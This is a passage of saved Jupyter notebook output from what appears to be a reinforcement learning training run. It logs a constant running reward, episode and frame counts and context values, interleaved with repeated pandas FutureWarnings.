    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 478\t Frame count: 262300\t Context: 2\n",
      "Running reward: 11.00\t Episode 478\t Frame count: 262400\t Context: 2\n",
      "Running reward: 11.00\t Episode 478\t Frame count: 262500\t Context: 2\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 262600\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 262700\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 262800\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 262900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 263000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 263100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 263200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 263300\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 263400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 263500\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 263600\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 263700\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 263800\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 263900\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 264000\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 264100\t Context: 1\n",
      "Running reward: 11.00\t Episode 479\t Frame count: 264200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 479\t Frame count: 264300\t Context: 1\n",
      "Running reward: 11.00\t Episode 480\t Frame count: 264400\t Context: 1\n",
      "Running reward: 11.00\t Episode 480\t Frame count: 264500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 480\t Frame count: 264600\t Context: 1\n",
      "Running reward: 11.00\t Episode 480\t Frame count: 264700\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 264800\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 264900\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 265000\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 265100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 481\t Frame count: 265200\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 265300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 481\t Frame count: 265400\t Context: 1\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 265500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 481\t Frame count: 265600\t Context: 2\n",
      "Running reward: 11.00\t Episode 481\t Frame count: 265700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 482\t Frame count: 265800\t Context: 1\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 265900\t Context: 1\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266000\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266100\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266200\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266300\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266400\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266500\t Context: 2\n",
      "Running reward: 11.00\t Episode 482\t Frame count: 266600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 483\t Frame count: 266700\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 266800\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 266900\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 267000\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 267100\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 267200\t Context: 1\n",
      "Running reward: 11.00\t Episode 484\t Frame count: 267300\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267400\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267500\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267600\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267700\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267800\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 267900\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 268000\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 268100\t Context: 2\n",
      "Running reward: 11.00\t Episode 485\t Frame count: 268200\t Context: 2\n",
      "Running reward: 11.00\t Episode 486\t Frame count: 268300\t Context: 1\n",
      "Running reward: 11.00\t Episode 486\t Frame count: 268400\t Context: 2\n",
      "Running reward: 11.00\t Episode 487\t Frame count: 268500\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 268600\t Context: 1\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 268700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 488\t Frame count: 268800\t Context: 1\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 268900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 488\t Frame count: 269000\t Context: 1\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 488\t Frame count: 269200\t Context: 1\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269300\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269400\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269500\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269600\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269700\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269800\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 269900\t Context: 2\n",
      "Running reward: 11.00\t Episode 488\t Frame count: 270000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 489\t Frame count: 270100\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270200\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270300\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 489\t Frame count: 270500\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270600\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270700\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270800\t Context: 1\n",
      "Running reward: 11.00\t Episode 489\t Frame count: 270900\t Context: 2\n",
      "Running reward: 11.00\t Episode 490\t Frame count: 271000\t Context: 1\n",
      "Running reward: 11.00\t Episode 490\t Frame count: 271100\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271200\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271300\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271400\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271500\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 491\t Frame count: 271700\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271800\t Context: 1\n",
      "Running reward: 11.00\t Episode 491\t Frame count: 271900\t Context: 2\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 492\t Frame count: 272100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 492\t Frame count: 272200\t Context: 1\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 492\t Frame count: 272400\t Context: 1\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272500\t Context: 1\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272600\t Context: 1\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272700\t Context: 1\n",
      "Running reward: 11.00\t Episode 492\t Frame count: 272800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 493\t Frame count: 272900\t Context: 1\n",
      "Running reward: 11.00\t Episode 493\t Frame count: 273000\t Context: 1\n",
      "Running reward: 11.00\t Episode 493\t Frame count: 273100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 493\t Frame count: 273200\t Context: 1\n",
      "Running reward: 11.00\t Episode 493\t Frame count: 273300\t Context: 1\n",
      "Running reward: 11.00\t Episode 493\t Frame count: 273400\t Context: 1\n",
      "Running reward: 11.00\t Episode 493\t Frame count: 273500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 493\t Frame count: 273600\t Context: 2\n",
      "Running reward: 11.00\t Episode 494\t Frame count: 273700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 494\t Frame count: 273800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 495\t Frame count: 273900\t Context: 1\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274000\t Context: 1\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274100\t Context: 1\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274200\t Context: 1\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274300\t Context: 2\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274400\t Context: 2\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274500\t Context: 2\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274600\t Context: 2\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274700\t Context: 2\n",
      "Running reward: 11.00\t Episode 495\t Frame count: 274800\t Context: 2\n",
      "Running reward: 11.00\t Episode 496\t Frame count: 274900\t Context: 1\n",
      "Running reward: 11.00\t Episode 496\t Frame count: 275000\t Context: 2\n",
      "Running reward: 11.00\t Episode 496\t Frame count: 275100\t Context: 2\n",
      "Running reward: 11.00\t Episode 496\t Frame count: 275200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 275300\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 275400\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 275500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 275600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 275700\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 275800\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 275900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 276000\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 276200\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276300\t Context: 1\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276400\t Context: 2\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276500\t Context: 2\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276600\t Context: 2\n",
      "Running reward: 11.00\t Episode 497\t Frame count: 276700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 276800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 497\t Frame count: 276900\t Context: 2\n",
      "Running reward: 11.00\t Episode 498\t Frame count: 277000\t Context: 1\n",
      "Running reward: 11.00\t Episode 498\t Frame count: 277100\t Context: 1\n",
      "Running reward: 11.00\t Episode 498\t Frame count: 277200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 498\t Frame count: 277300\t Context: 1\n",
      "Running reward: 11.00\t Episode 498\t Frame count: 277400\t Context: 2\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 277500\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 277600\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 277700\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 277800\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 277900\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 278000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 499\t Frame count: 278100\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 278200\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 278300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 499\t Frame count: 278400\t Context: 1\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 278500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 499\t Frame count: 278600\t Context: 2\n",
      "Running reward: 11.00\t Episode 499\t Frame count: 278700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 500\t Frame count: 278800\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 278900\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279000\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279100\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279200\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279300\t Context: 1\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279400\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279500\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 500\t Frame count: 279700\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279800\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 279900\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 280000\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 280100\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 280200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
